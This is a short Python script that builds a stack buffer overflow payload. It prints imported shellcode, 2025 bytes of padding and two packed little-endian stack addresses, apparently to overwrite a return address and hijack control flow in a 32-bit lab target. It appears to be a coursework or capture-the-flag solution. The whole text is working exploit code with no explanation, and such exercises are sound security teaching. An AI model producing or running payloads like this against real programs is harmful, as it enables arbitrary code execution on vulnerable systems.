from shellcode import shellcode
from struct import pack

print(shellcode + "0" * 2025 + pack("<I", 0xbffe9158) + pack("<I", 0xbffe996c))
